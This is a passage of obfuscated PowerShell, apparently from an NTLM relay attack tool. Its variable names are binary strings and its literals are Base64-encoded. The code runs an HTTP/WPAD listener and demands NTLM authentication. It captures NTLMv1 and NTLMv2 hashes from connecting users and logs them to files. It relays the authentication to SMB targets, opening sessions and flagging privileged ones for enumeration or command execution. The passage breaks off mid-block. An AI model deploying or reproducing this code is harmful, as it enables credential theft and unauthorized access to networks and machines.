    ${00110101011000100} = New-Object System.Net.Sockets.TcpListener ${00111111001010011}
    ${00110101111010100} = _01110110101010101
    ${00100010011101111} = 0
    if(${00010010100101100})
    {
        ${01110110110001101} = New-Object System.Net.Sockets.LingerOption($true,0)
        ${00110101011000100}.Server.LingerState = ${01110110110001101}
    }
    try
    {
        ${00110101011000100}.Start()
    }
    catch
    {
        ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting ${10100100100010110} listener")
        ${01010110011101100} = $false
        if(${10001101011100010}.file_output)
        {
            ${10001101011100010}.log_file_queue.Add("[-] [$(Get-Date -format s)] Error starting ${10100100100010110} listener")
        }
        if(${10001101011100010}.log_output)
        {
            ${10001101011100010}.log.Add("[-] [$(Get-Date -format s)] Error starting ${10100100100010110} listener")
        }
    }
    :HTTP_listener_loop while(${10001101011100010}.relay_running -and ${01010110011101100})
    {
        ${01101000010100010} = $null
        ${01100001110111100} = New-Object System.Byte[] 4096
        ${10111011111111011} = $true
        ${10001110010111001} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAHQAZQB4AHQALwBoAHQAbQBsAA=='))))
        ${00001000101000000} = $null
        ${10111001011010010} = $null
        ${00001110011010001} = $null
        ${10101111110010101} = ''
        ${00011010101101110} = ''
        ${01110010110110111} = $null
        ${01100010100010010} = $null
        ${01110111101111111} = $null
        ${10001100110111001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        if(!${10111001001010100}.Connected -and ${10001101011100010}.relay_running)
        {
            ${01101111010111001} = $false
            ${01000111000110010} = ${00110101011000100}.BeginAcceptTcpClient($null,$null)
            do
            {
                if(!${10001101011100010}.relay_running)
                {
                    break HTTP_listener_loop
                }
                sleep -m 10
            }
            until(${01000111000110010}.IsCompleted)
            ${10111001001010100} = ${00110101011000100}.EndAcceptTcpClient(${01000111000110010})
            ${00110111010101001} = ${10111001001010100}.Client.Handle
            if(${10100011111011100})
            {
                ${10110101111000011} = ${10111001001010100}.GetStream()
                ${10011110101001111} = New-Object System.Net.Security.SslStream(${10110101111000011},$false)
                ${10111110111011101} = (ls Cert:\LocalMachine\My | ? {$_.Subject -match ${10001101011100010}.certificate_CN})
                ${10011110101001111}.AuthenticateAsServer(${10111110111011101},$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                ${10011110101001111} = ${10111001001010100}.GetStream()
            }
        }
        if(${00100010011101111} -gt 0)
        {
            ${01111001001110000}++
            if(${01111001001110000} -gt 2)
            {
                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay attack resetting") > $null
                ${00100010011101111} = 0
            }
        }
        else
        {
            ${01111001001110000} = 0
        }
        if(${10100011111011100})
        {
            [Byte[]]${01000111011010110} = $null
            while(${10110101111000011}.DataAvailable)
            {
                ${00000011001100100} = ${10011110101001111}.Read(${01100001110111100},0,${01100001110111100}.Length)
                ${01000111011010110} += ${01100001110111100}[0..(${00000011001100100} - 1)]
            }
            ${01101000010100010} = [System.BitConverter]::ToString(${01000111011010110})
        }
        else
        {
            while(${10011110101001111}.DataAvailable)
            {
                ${10011110101001111}.Read(${01100001110111100},0,${01100001110111100}.Length) > $null
            }
            ${01101000010100010} = [System.BitConverter]::ToString(${01100001110111100})
        }
        if(${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwACoA'))) -or ${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwACoA'))) -or ${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABmAC0ANABlAC0ANQAzAC0AMgAwACoA'))) -or ${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANABmAC0ANABlAC0ANABlAC0ANAA1AC0ANAAzAC0ANQA0ACoA'))))
        {
            ${00110110010010010} = ${01101000010100010}.Substring(${01101000010100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 4,${01101000010100010}.Substring(${01101000010100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 1).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) - 3)
            ${00110110010010010} = ${00110110010010010}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${01110111101111111} = New-Object System.String (${00110110010010010},0,${00110110010010010}.Length)
            ${01111110001110001} = ${10111001001010100}.Client.RemoteEndpoint.Address.IPAddressToString
            ${01000010001011111} = ${10111001001010100}.Client.RemoteEndpoint.Port
            ${01111000101001001} = $true
            if((${01101000010100010}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwAA==')))))
            {
                ${00011110000011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBFAFQA')))
            }
            elseif((${01101000010100010}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwAA==')))))
            {
                ${00011110000011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABFAEEARAA=')))
            }
            elseif((${01101000010100010}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABGAC0ANABFAC0ANQAzAC0AMgAwAA==')))))
            {
                ${00011110000011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBQAFQASQBPAE4AUwA=')))
            }
            elseif((${01101000010100010}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANABGAC0ANABFAC0ANABFAC0ANAA1AC0ANAAzAC0ANQA0AA==')))))
            {
                ${00011110000011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAE4ATgBFAEMAVAA=')))
            }
            if(${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAOAAtADYARgAtADcAMwAtADcANAAtADMAQQAtADIAMAAtACoA'))))
            {
                ${10100110101110001} = ${01101000010100010}.Substring(${01101000010100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADgALQA2AEYALQA3ADMALQA3ADQALQAzAEEALQAyADAALQA=')))) + 19)
                ${10100110101110001} = ${10100110101110001}.Substring(0,${10100110101110001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${10100110101110001} = ${10100110101110001}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01110010110110111} = New-Object System.String (${10100110101110001},0,${10100110101110001}.Length)
            }
            if(${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADUANQAtADcAMwAtADYANQAtADcAMgAtADIARAAtADQAMQAtADYANwAtADYANQAtADYARQAtADcANAAtADMAQQAtADIAMAAtACoA'))))
            {
                ${10011010111000100} = ${01101000010100010}.Substring(${01101000010100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADUALQA3ADMALQA2ADUALQA3ADIALQAyAEQALQA0ADEALQA2ADcALQA2ADUALQA2AEUALQA3ADQALQAzAEEALQAyADAALQA=')))) + 37)
                ${10011010111000100} = ${10011010111000100}.Substring(0,${10011010111000100}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${10011010111000100} = ${10011010111000100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${01100010100010010} = New-Object System.String (${10011010111000100},0,${10011010111000100}.Length)
            }
            if(${10110000001010110} -ne ${01110111101111111} -or ${00110111010101001} -ne ${10111001001010100}.Client.Handle)
            {
                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) ${00011110000011000} request for ${01110111101111111} received from ${01111110001110001}") > $null
                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) host header ${01110010110110111} received from ${01111110001110001}") > $null
                if(${01100010100010010})
                {
                    ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) user agent received from ${01111110001110001}`:`n${01100010100010010}") > $null
                }
                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | ? {${01100010100010010} -match $_}))
                {
                    ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] - ${10100100100010110}($HTTPPort) ignoring wpad.dat request due to user agent from ${01111110001110001}") > $null
                }
            }
            if(${01101000010100010} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAMQAtADcANQAtADcANAAtADYAOAAtADYARgAtADcAMgAtADYAOQAtADcAQQAtADYAMQAtADcANAAtADYAOQAtADYARgAtADYARQAtADMAQQAtADIAMAAtACoA'))))
            {
                ${01111110011100010} = ${01101000010100010}.Substring(${01101000010100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADEALQA3ADUALQA3ADQALQA2ADgALQA2AEYALQA3ADIALQA2ADkALQA3AEEALQA2ADEALQA3ADQALQA2ADkALQA2AEYALQA2AEUALQAzAEEALQAyADAALQA=')))) + 46)
                ${01111110011100010} = ${01111110011100010}.Substring(0,${01111110011100010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
                ${01111110011100010} = ${01111110011100010}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                ${00011010101101110} = New-Object System.String (${01111110011100010},0,${01111110011100010}.Length)
            }
            if((${01110111101111111} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (${01110111101111111} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))) -or (
            ${01110111101111111} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and $WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | ? {${01100010100010010} -match $_})))
            {
                ${00011101011101101} = 0x32,0x30,0x30
                ${10100101101100000} = 0x4f,0x4b
                ${01101111010111001} = $true
            }
            else
            {
                if(${00010010100101100})
                {
                    ${00011101011101101} = 0x34,0x30,0x37
                    ${10111001011010010} = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    ${00011101011101101} = 0x34,0x30,0x31
                    ${10111001011010010} = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                ${10100101101100000} = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
            if(${00011010101101110}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
            {
                ${00011010101101110} = ${00011010101101110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
                [Byte[]]${_00011101001001110} = [System.Convert]::FromBase64String(${00011010101101110})
                ${01111000101001001} = $false
                if([System.BitConverter]::ToString(${_00011101001001110}[8..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    if(${10001101011100010}.SMB_relay -and ${00100010011101111} -eq 0)
                    {
                        ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) to SMB relay initiated by ${01111110001110001}") > $null
                        ${00101110010010001} = _01100000011010110 ${00110101111010100} ${01111110001110001}
                        $target = ${00101110010010001}[1]
                        ${01001110110000101} = ${00101110010010001}[0]
                        if(!$target)
                        {
                            ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] Eligible target not found") > $null
                            ${00100010011101111} = 0
                        }
                        elseif(!${01001110110000101}.connected)
                        {
                            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                            {
                                if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target -and !${10001101011100010}.enumerate[${10000101000101100}]."Signing")
                                {
                                    ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] Relay target $target is not responding") > $null
                                    break
                                }
                            }
                            ${00100010011101111} = 0
                        }
                        else
                        {
                            ${00100010011101111} = 1
                        }
                        if(${00100010011101111} -eq 1)
                        {
                            ${01100110111000100} = _01111100000000000 ${01001110110000101} ${_00011101001001110} ${_00100111010100111} ${00110101111010100}
                            if(${01100110111000100}.Length -le 3)
                            {
                                ${00100010011101111} = 0
                                ${01101111010111001} = $true
                                ${10001100110111001} = _01010101010101000 $Challenge ${01111110001110001} ${10111001001010100}.Client.RemoteEndpoint.Port
                            }
                        }
                        if(${00100010011101111} -eq 1)
                        {
                            ${_00010000111001010} = ${01100110111000100}[34..33]
                            ${10111111101111101} = [System.BitConverter]::ToString(${01100110111000100})
                            ${10111111101111101} = ${10111111101111101} -replace "-",""
                            ${10001111001001110} = ${10111111101111101}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
                            ${01010000011010100} = ${10001111001001110} / 2
                            ${01000111110011010} = _01100110110110101 (${01010000011010100} + 12) ${01100110111000100}
                            ${10110000111110001} = ${01100110111000100}[(${01010000011010100} + 12)..(${01010000011010100} + 19)]
                            ${01110010001010101} = _01100110110110101 (${01010000011010100} + 40) ${01100110111000100}
                            ${00001000101110111} = ${01100110111000100}[(${01010000011010100} + 40)..(${01010000011010100} + 55 + ${01000111110011010})]
                            ${10011100011111100} = ${01100110111000100}[(${01010000011010100} + 22)]
                            ${10111011101100011} = ${01100110111000100}[(${01010000011010100} + 24)..(${01010000011010100} + 31)]
                            ${10011000000010011} = ${01100110111000100}[(${01010000011010100} + 56 + ${01000111110011010})..(${01010000011010100} + 55 + ${01000111110011010} + ${01110010001010101})]
                            ${_10110110010000000} = ${01100110111000100}[44..51]
                            ${10111101100010011} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                               ${10110000111110001} +
                                               0x05,0x82 +
                                               ${10011100011111100} +
                                               0xa2 +
                                               ${10111011101100011} +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                               ${00001000101110111} +
                                               ${10011000000010011}
                            ${10010000010011000} = [System.Convert]::ToBase64String(${10111101100010011})
                            ${10001100110111001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${10010000010011000}
                            ${10010001111000000} = _01001010000101001 ${01100110111000100}
                            if(!${10001101011100010}.HTTP_session_table.ContainsKey($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA=')))))
                            {
                                ${10001101011100010}.HTTP_session_table.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA='))),${10100000110011111})
                            }
                            else
                            {
                                ${10001101011100010}.HTTP_session_table[$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAwADAAMQAxADEAMAAwADAAMQAwADAAMQAwAH0AOgAkAHsAXwAxADAAMAAxADEAMQAxADAAMQAxADAAMQAwADEAMQAwADAAfQA=')))] = ${10100000110011111}
                            }
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge ${10010001111000000} for relay from $Target") > $null
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge ${10010001111000000} for relay to ${01111110001110001}") > $null
                            ${00100010011101111} = 2
                        }
                        else
                        {
                            ${10001100110111001} = _01010101010101000 $Challenge ${01111110001110001} ${10111001001010100}.Client.RemoteEndpoint.Port
                        }
                    }
                    else
                    {
                        ${10001100110111001} = _01010101010101000 $Challenge ${01111110001110001} ${10111001001010100}.Client.RemoteEndpoint.Port
                    }
                }
                elseif([System.BitConverter]::ToString(${_00011101001001110}[8..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${00110110000100101} = _01100110110110101 20 ${_00011101001001110}
                    ${00111011010111101} = _10111011101101011 24 ${_00011101001001110}
                    ${00000011101110001} = _01100110110110101 28 ${_00011101001001110}
                    ${00011110001010011} = _10111011101101011 32 ${_00011101001001110}
                    ${10010001111000000} = ${10001101011100010}.HTTP_session_table.$Session
                    if(${00000011101110001} -eq 0)
                    {
                        ${10001110110010100} = $null
                    }
                    else
                    {  
                        ${10001110110010100} = _10110010000011111 ${00011110001010011} ${00000011101110001} ${_00011101001001110}
                    } 
                    ${10011010111010100} = _01100110110110101 36 ${_00011101001001110}
                    ${00110011011100011} = _10111011101101011 40 ${_00011101001001110}
                    if(${10011010111010100} -eq 0)
                    {    
                        ${00101100100001000} = $null
                    }
                    else
                    {
                        ${00101100100001000} = _10110010000011111 ${00110011011100011} ${10011010111010100} ${_00011101001001110}
                    }
                    ${01001111001000100} = ${10001110110010100} + "\" + ${00101100100001000}
                    ${00001000100000011} = _01100110110110101 44 ${_00011101001001110}
                    ${11000000001100000} = _10111011101101011 48 ${_00011101001001110}
                    ${01010101100101001} = _10110010000011111 ${11000000001100000} ${00001000100000011} ${_00011101001001110}
                    if(${00110110000100101} -eq 24) 
                    {
                        ${01001000001001001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADEA')))
                        ${10001110101111001} = [System.BitConverter]::ToString(${_00011101001001110}[(${00111011010111101} - 24)..(${00111011010111101} + ${00110110000100101})]) -replace "-",""
                        ${10001110101111001} = ${10001110101111001}.Insert(48,':')
                        ${00011000001100110} = ${00101100100001000} + "::" + ${10001110110010100} + ":" + ${10001110101111001} + ":" + ${10010001111000000}
                        if(${10010001111000000} -and ${10001110101111001} -and (${10001101011100010}.machine_accounts -or (!${10001101011100010}.machine_accounts -and -not ${00101100100001000}.EndsWith('$'))))
                        {     
                            ${10001101011100010}.NTLMv1_list.Add(${00011000001100110}) > $null
                            if(!${10001101011100010}.console_unique -or (${10001101011100010}.console_unique -and ${10001101011100010}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA==')))))
                            {
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) ${01001000001001001} captured for ${01001111001000100} from ${01111110001110001}($NTLM_host_string)`:${01000010001011111}`:") > $null
                                ${10001101011100010}.output_queue.Add(${00011000001100110}) > $null
                            }
                            else
                            {
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) ${01001000001001001} captured for ${01001111001000100} from ${01111110001110001}($NTLM_host_string)`:${01000010001011111}`:`n[not unique]") > $null
                            }
                            if(${10001101011100010}.file_output -and (!${10001101011100010}.file_unique -or (${10001101011100010}.file_unique -and ${10001101011100010}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA=='))))))
                            {
                                ${10001101011100010}.NTLMv1_file_queue.Add(${00011000001100110}) > $null
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) ${01001000001001001} written to " + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAtAE4AVABMAE0AdgAxAC4AdAB4AHQA')))) > $null
                            }
                            if(${10001101011100010}.NTLMv1_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA=='))))
                            {
                                ${10001101011100010}.NTLMv1_username_list.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA==')))) > $null
                            }
                        }
                    }
                    else 
                    {   
                        ${01001000001001001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADIA')))           
                        ${10001110101111001} = [System.BitConverter]::ToString(${_00011101001001110}[${00111011010111101}..(${00111011010111101} + ${00110110000100101})]) -replace "-",""
                        ${10001110101111001} = ${10001110101111001}.Insert(32,':')
                        ${00011000001100110} = ${00101100100001000} + "::" + ${10001110110010100} + ":" + ${10010001111000000} + ":" + ${10001110101111001}
                        if(${10010001111000000} -and ${10001110101111001} -and (${10001101011100010}.machine_accounts -or (!${10001101011100010}.machine_accounts -and -not ${00101100100001000}.EndsWith('$'))))
                        {
                            ${10001101011100010}.NTLMv2_list.Add(${00011000001100110}) > $null
                            if(!${10001101011100010}.console_unique -or (${10001101011100010}.console_unique -and ${10001101011100010}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA==')))))
                            {
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) NTLMv2 captured for ${01001111001000100} from ${01111110001110001}($NTLM_host_string)`:${01000010001011111}`:") > $null
                                ${10001101011100010}.output_queue.Add(${00011000001100110}) > $null
                            }
                            else
                            {
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) NTLMv2 captured for ${01001111001000100} from ${01111110001110001}($NTLM_host_string)`:${01000010001011111}`:`n[not unique]") > $null
                            }
                            if(${10001101011100010}.file_output -and (!${10001101011100010}.file_unique -or (${10001101011100010}.file_unique -and ${10001101011100010}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA=='))))))
                            {
                                ${10001101011100010}.NTLMv2_file_queue.Add(${00011000001100110}) > $null
                                ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ${10100100100010110}($HTTPPort) NTLMv2 written to " + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAtAE4AVABMAE0AdgAyAC4AdAB4AHQA')))) > $null
                            }
                            if(${10001101011100010}.NTLMv2_username_list -notcontains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA=='))))
                            {
                                ${10001101011100010}.NTLMv2_username_list.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADEAMQAxADEAMAAwADAAMQAxADEAMAAwADAAMQB9ACAAJAB7ADAAMQAwADAAMQAxADEAMQAwADAAMQAwADAAMAAxADAAMAB9AA==')))) > $null
                            }
                        }
                    }
                    if(${10001110110010100} -and ${00101100100001000} -and ${01010101100101001} -and ${01111110001110001})
                    {
                        _01110000000001101 ${10001110110010100} ${00101100100001000} ${01010101100101001} ${01111110001110001}
                    }
                    ${00011101011101101} = 0x32,0x30,0x30
                    ${10100101101100000} = 0x4f,0x4b
                    ${01101111010111001} = $true
                    ${10010001111000000} = $null
                    if(${10001101011100010}.SMB_relay -and ${00100010011101111} -eq 2)
                    {
                        if(!$Username -or $Username -contains ${00101100100001000} -or $Username -contains ${01001111001000100})
                        {
                            if(${10001101011100010}.machine_accounts -or (!${10001101011100010}.machine_accounts -and -not ${00101100100001000}.EndsWith('$')))
                            {
                                if(${10001101011100010}.relay_failed_login_table.${01001111001000100}.Count -le $FailedLoginThreshold)
                                {
                                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Sending ${01001000001001001} response for ${01001111001000100} for relay to $Target") > $null
                                    ${10000001100000110} = _00001011111001101 ${01001110110000101} ${_00011101001001110} ${_00100111010100111} ${_00010000111001010} ${_10110110010000000} ${00110101111010100}
                                    if(!${10000001100000110})
                                    {
                                        ${10001101011100010}.session_current = ${10001101011100010}.session_count
                                        ${10001101011100010}.session_message_ID_table.Add(${10001101011100010}.session_count,3)
                                        if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
                                        {
                                            if(${01001110110000101}.Connected)
                                            {
                                                ${10001101011100010}.session_socket_table[${10001101011100010}.session_count] = ${01001110110000101}
                                                ${10001101011100010}.session_table[${10001101011100010}.session_count] = ${_10110110010000000}
                                                ${10001101011100010}.session_lock_table[${10001101011100010}.session_count] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA=')))
                                                ${01010001100010110} = _01110111011000100 ${01001110110000101} ${_00100111010100111} ${_00010000111001010} ${_10110110010000000} ${00110101111010100} $true
                                                ${01100010111011101} = New-Object PSObject
                                                Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Session ${10001101011100010}.session_count
                                                Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Target ${01001110110000101}.Client.RemoteEndpoint.Address.IPaddressToString
                                                Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Initiator ${01111110001110001}
                                                Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name User ${01001111001000100}
                                                if(${01010001100010110})
                                                {
                                                    Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Privileged $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAHMA')))
                                                }
                                                else
                                                {
                                                    Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Privileged "no"
                                                }
                                                if(${01001110110000101}.Connected)
                                                {
                                                    ${_00111100010011010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AbgBlAGMAdABlAGQA')))
                                                    Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name Status ${_00111100010011010}
                                                    Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBzAHQAYQBiAGwAaQBzAGgAZQBkAA=='))) $(Get-Date -format s)
                                                    Add-Member -InputObject ${01100010111011101} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdAAgAEEAYwB0AGkAdgBpAHQAeQA='))) $(Get-Date -format s)
                                                    ${10001101011100010}.session += ${01100010111011101}
                                                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Session $(${10001101011100010}.session_count) added to session list") > $null
                                                }
                                            }
                                        }
                                        if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) -or $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))))
                                        {
